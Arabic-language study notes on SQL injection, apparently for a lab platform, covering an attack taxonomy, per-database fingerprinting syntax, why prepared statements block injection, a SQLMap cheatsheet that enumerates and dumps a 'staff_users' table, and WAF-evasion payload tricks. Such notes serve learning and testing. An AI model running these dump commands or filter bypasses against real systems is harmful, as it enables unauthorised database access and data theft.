# ملاحظات تقنية متقدمة وهندسية: حقن قواعد البيانات (SQL Injection Advanced Notes)

---

## 1. التصنيف الهيكلي الشامل لثغرات SQL Injection (The SQLi Taxonomy)

تُصنف هجمات حقن قواعد البيانات إلى ثلاثة فروع رئيسية بناءً على القناة المستخدمة وحجم التغذية الراجعة من الخادم:

```text
                                  ┌───────────────────────────┐
                                  │   SQL INJECTION (SQLi)    │
                                  └─────────────┬─────────────┘
                                                │
         ┌──────────────────────────────┼──────────────────────────────┐
         ▼                              ▼                              ▼
┌──────────────────┐          ┌──────────────────┐          ┌──────────────────┐
│  1. IN-BAND SQLi │          │ 2. INFERENTIAL   │          │ 3. OUT-OF-BAND   │
│  (Same Channel)  │          │  (BLIND SQLi)    │          │  (OOB Channel)   │
├──────────────────┤          ├──────────────────┤          ├──────────────────┤
│ • UNION-Based    │          │ • Boolean-Based  │          │ • DNS Exfiltration│
│ • Error-Based    │          │ • Time-Based     │          │ • HTTP / SMB Req │
└──────────────────┘          └──────────────────┘          └──────────────────┘
```

---

## 2. مصفوفة تحديد بصمة محرك قاعدة البيانات (DBMS Fingerprinting Matrix)

تختلف صياغة ودوال استعلامات SQL عبر المحركات المختلفة، مما يستدعي إجراء مسح دقيق للبصمة لتوجيه الحمولات المناسبة:

| الخاصية التكتيكية | MySQL / MariaDB | Microsoft SQL Server (MSSQL) | PostgreSQL | Oracle Database | SQLite |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **استعلام الإصدار (Version)** | `SELECT @@version;` | `SELECT @@version;` | `SELECT version();` | `SELECT banner FROM v$version;` | `SELECT sqlite_version();` |
| **رموز التعليق (Comments)** | `-- ` أو `#` أو `/* */` | `--` أو `/* */` | `--` أو `/* */` | `--` أو `/* */` | `--` أو `/* */` |
| **ربط النصوص (Concat)** | `CONCAT('a', 'b')` | `'a' + 'b'` | `'a' \|\| 'b'` | `'a' \|\| 'b'` | `'a' \|\| 'b'` |
| **دوال التأخير الزمني (Sleep)** | `SLEEP(5)` | `WAITFOR DELAY '0:0:5'` | `pg_sleep(5)` | `dbms_pipe.receive_message()` | ثقيلة عبر `randomblob()` |
| **جدول حصر الجداول (Catalog)** | `information_schema.tables` | `information_schema.tables` | `information_schema.tables` | `all_tables` | `sqlite_master` |
| **استعلامات مكدسة (Stacked)** | غير مدعوم في PHP/MySQL | مدعوم أصلياً (افتراضي) | مدعوم | مدعوم في كتل PL/SQL | غير مدعوم في معظم واجهات الويب |

---

## 3. التحليل المعماري لشجرة البناء المجرد (Abstract Syntax Tree - AST)

### لماذا تفشل الاستعلامات المدمجة برمجياً؟
عندما يتم تجميع كود SQL، يمر النص عبر محلل نحوي (Lexer & Parser) يبني شجرة بناء مجرد (AST):
* في الاستعلام غير الآمن:
  `"SELECT * FROM users WHERE name = '" + userInput + "'"`
  يقوم المحلل النحوي بتحليل النص بالكامل بعد دمج معطيات المستخدم. إذا احتوت المعطيات على علامة تنصيص `'`، يتغير جذر الشجرة وتتحول المدخلات من عقدة "بيانات نصية" (Literal Leaf) إلى عقدة "مشغل منطقي" (Operator Node مثل `OR`), مما يغير معنى البرنامج جذرياً!

### الحصانة التامة في الاستعلامات المجهزة (Prepared Statements):
* في الاستعلامات المجهزة، يرسل التطبيق قالب الاستعلام أولاً إلى الخادم:
  `SELECT * FROM users WHERE name = ?`
* يقوم محرك قاعدة البيانات بتجميع الـ AST وتثبيت هيكل الشجرة مسبقاً وتخصيص العقدة كـ "بيانات صلبة".
* عند تمرير قيمة المستخدم لاحقاً عبر البروتوكول الثنائي، يتعامل المحرك معها كقيمة حرفية صرفة، ويستحيل على أي محرف أن يغير هيكل الشجرة المجمعة مسبقاً.

---

## 4. مرجع وأوامر أتمتة الفحص عبر SQLMap (SQLMap Cheatsheet)

تعتبر أداة **SQLMap** المحرك الآلي الأكثر تقدماً لاستغلال ثغرات SQLi واكتشافها:

```bash
# 1. فحص نقطة نهاية بسيطة عبر GET:
sqlmap -u "https://website.thm/article?id=1" --batch

# 2. فحص طلب POST مع بيانات النموذج:
sqlmap -u "https://website.thm/login" --data="username=admin&password=123" -p username --batch

# 3. استخدام طلب محفوظ من Burp Suite (الأفضل والأدق):
sqlmap -r request.txt -p id --batch

# 4. استخراج أسماء قواعد البيانات:
sqlmap -r request.txt --dbs

# 5. استخراج جداول قاعدة بيانات معينة:
sqlmap -r request.txt -D sqli_one --tables

# 6. استخراج أعمدة جدول معين:
sqlmap -r request.txt -D sqli_one -T staff_users --columns

# 7. سحب وتفريغ بيانات الجدول:
sqlmap -r request.txt -D sqli_one -T staff_users --dump

# 8. حصر تقنية الحقن (U: Union, B: Boolean, T: Time):
sqlmap -r request.txt --technique=U
```

---

## 5. تقنيات تجاوز فلاتر جدران الحماية (WAF Evasion Techniques)

1. **التعليقات المضمنة (Inline Comments):**
   * كسر الكلمات المفتاحية عبر تعليقات SQL لإرباك الفلاتر السطحية:
     `UN/**/ION/**/SEL/**/ECT`
2. **التبديل بين الحروف الكبيرة والصغيرة (Case Variation):**
   * تجاوز فلاتر Regex الحساسة لحالة الأحرف:
     `uNiOn sElEcT`
3. **استبدال المسافات البيضاء بمحارف بديلة (Whitespace Bypass):**
   * استخدام علامات الجدولة والأسطر الجديدة ومحارف التغذية:
     `%09` (Tab), `%0A` (Line Feed), `%0C` (Form Feed), أو استخدام الأقواس:
     `SELECT(username)FROM(users)`
4. **الترميز المزدوج (Double URL Encoding):**
   * إرسال الحمولات بترميز النسبة المئوية مرتين:
     `%2527` (لتمثيل علامة التنصيص `'`)
